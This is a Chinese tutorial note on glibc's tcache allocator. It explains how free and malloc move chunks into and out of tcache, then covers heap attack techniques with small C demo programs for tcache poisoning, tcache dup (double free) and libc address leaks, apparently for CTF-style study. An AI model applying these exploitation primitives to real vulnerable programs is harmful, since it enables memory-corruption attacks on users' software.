# Tcache

和CPU的cache机制差不多，这玩意也是设一小块地方，让malloc和free的时候，直接从tcache取/放合适的大小，这样就不用去bin中找，可以加快速度。不过注意一下，不像cpu的cache有硬件支持，tcache是纯软件机制，是直接在内存中实现的。先来研究下Tcache结构，以及什么情况下会用到Tcache。

Tcache是和fastbin类似的单链表结构，LIFO，支持的最大chunk size是0x410，最大允许的用户请求大小是0x408，按大小分类，比如0x10一类、0x20一类.....0x120一类（以0x10为步进划分），每一类的数量以mp_.tcache_count为准，一般glibc中这个值等于7，也就是每一类最多不超过7。引入tcache后，\_init\_free和\_\_libc\_malloc里就多了个调用tcache_put()和tcache_get的环节，看名字也知道就是把chunk放进tcache和从tcache里取出chunk。那么在malloc的时候，就会优先从tcache里看有无合适大小的chunk，而不是从fastbin或者unsortedbin找，在free的时候，也会优先把chunk放入tcache。

malloc和free对tcache的取放也有很多细节。
首先是放入的情况：

free的时候，会优先检查chunk能否放入tcache

```c
_int_free (mstate av, mchunkptr p, int have_lock) 
{ 
	INTERNAL_SIZE_T size; /* its size */ 
	mfastbinptr *fb; /* associated fastbin */ 
	mchunkptr nextchunk; /* next contiguous chunk */ 
	INTERNAL_SIZE_T nextsize; /* its size */ 
	int nextinuse; /* true if nextchunk is used */ 
	INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ 
	mchunkptr bck; /* misc temp for linking */ 
	mchunkptr fwd; /* misc temp for linking */ 
	size = chunksize (p); 
	/* Little security check which won't hurt performance: the allocator never wrapps around at the end of the address space. Therefore we can exclude some size values which might appear here by accident or by "design" from some intruder. */ 
	if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0) 
	|| __builtin_expect (misaligned_chunk (p), 0)) 
	malloc_printerr ("free(): invalid pointer"); 
	/* We know that each chunk is at least MINSIZE bytes in size or a multiple of MALLOC_ALIGNMENT. */ 
	if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size))) malloc_printerr ("free(): invalid size"); 
	check_inuse_chunk(av, p); 
	#if USE_TCACHE 
	{ 
		size_t tc_idx = csize2tidx (size); 
		if (tcache 
		&& tc_idx < mp_.tcache_bins 
		&& tcache->counts[tc_idx] < mp_.tcache_count) 
		{ 
			tcache_put (p, tc_idx); 
			return; 
		} 
	} 
	#endif ...... }
```

malloc则会有多种情况，
一，malloc申请的chunk符合fastbin大小，且fastbin中确实有可用空闲块，那分配的时候顺便把fastbin里其他的chunk放入tcache（注意是其他chunk而不是分配的chunk噢）。
二，申请符合smallbin大小时，和一情况差不多，分配时把其他smallbin的chunk放入tcache。
三，申请的chunk需要在unsortedbin中找的时候，在双向链表中找到合适tcache size的chunk时（且tcache中还没满，没到tcache_count），则直接放入tcache，即最后unsortedbin中所有符合tcache条件的chunk都会放入tcache

还有是取出的情况：
一，tcache里刚好malloc请求的内存，那就取出
二，放入unsortedbin的chunk到tcache时，如果检查发现放入达到限制了，就立刻取出刚刚放入的chunk，不过默认是没有上限的
```c
#if USE_TCACHE 
/* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */ 
	++tcache_unsorted_count;
	if (return_cached 
	&& mp_.tcache_unsorted_limit > 0 
	&& tcache_unsorted_count > mp_.tcache_unsorted_limit) 
	{ return tcache_get (tc_idx); } 
#endif
```
三，由于malloc的时候，会优先用unsortedbin填充tcache，这时候如果有满足malloc条件的chunk且已经在填充时放入了tcache，则会在tcache填充完后取出。
```c
#if USE_TCACHE 
/* If all the small chunks we found ended up cached, return one now. */ 
if (return_cached) { return tcache_get (tc_idx); } 
#endif
```

## 攻击方法

### Tcache poisoning

通过覆盖Tcache的next指针来直接实现malloc到任意地址，攻击方法和fastbin-attack类似，都是先分配一个chunk后free，接着利用其他漏洞去改已经释放的chunk的next指针，使其指向想分配的地址，然后malloc两次就得到了指向特定地址的chunk。这个比fastbin-attack还爽，因为不用伪造size之类的。

```c
//glibc_2.26
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
int main()
{
fprintf(stderr, "This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
"returning a pointer to an arbitrary location (in this case, the stack).\n"
"The attack is very similar to fastbin corruption attack.\n\n");

size_t stack_var;
fprintf(stderr, "The address we want malloc() to return is %p.\n", (char*)&stack_var);
fprintf(stderr, "Allocating 1 buffer.\n");
intptr_t *a = malloc(128);
fprintf(stderr, "malloc(128): %p\n", a);
fprintf(stderr, "Freeing the buffer...\n");
free(a);  

fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
"to point to the location to control (%p).\n", sizeof(intptr_t),a, &stack_var);
a[0] = (intptr_t)&stack_var;

fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);

intptr_t *b = malloc(128);
fprintf(stderr, "2st malloc(128): %p\n", b);
fprintf(stderr, "We got the control\n");
return 0;
}
```

### Tcache dup

类似double free，通过free同一个块两次，来实现任意地址写

```c
//glibc_2.26
#include <stdio.h>
#include <stdlib.h>

int main()
{
fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");
fprintf(stderr, "Allocating buffer.\n");
int *a = malloc(8);
fprintf(stderr, "malloc(8): %p\n", a);
fprintf(stderr, "Freeing twice...\n");
free(a);
free(a);
fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
return 0;
}
```

### Tcache perthread corruption

tcache由tcache_perthread_struct这个结构来管理，如果可以利用tcache poisoning之类的漏洞，获取到这个结构的指针，那就可以控制整个tcache

### Tcache stashing unlink

前面说了，对于smallbin，只要tcache还有空闲就会把smallbin全放进来，但是这个放的时候，只对放的第一个smallbin做了检查，也就是说，可以通过写已有smallbin的bk指针，然后利用tcache机制把一个fake地址放进tcache，实现任意地址分配

### 泄漏libc

没有引入tcache时，打印一个释放的指针，就能得到一个和libc有固定偏移的地址（unsorted bin），进而算出libc

```c
int main() 
{
	long *a = malloc(0x1000); 
	malloc(0x10);
	free(a);
	printf("%p\n",a[0]); 
}
```

有了tcache后，我们必须先把tcache填满，然后才能使chunk放到unsorted bin里

```c
int main(int argc , char* argv[]) 
{ 
	long* t[7];
	long *a=malloc(0x100); 
	long *b=malloc(0x10); 
	for(int i=0;i<7;i++) 
		t[i]=malloc(0x100); 
	for(int i=0;i<7;i++) 
		free(t[i]); 
	free(a); 
	printf("%p\n",a[0]); 
}
```
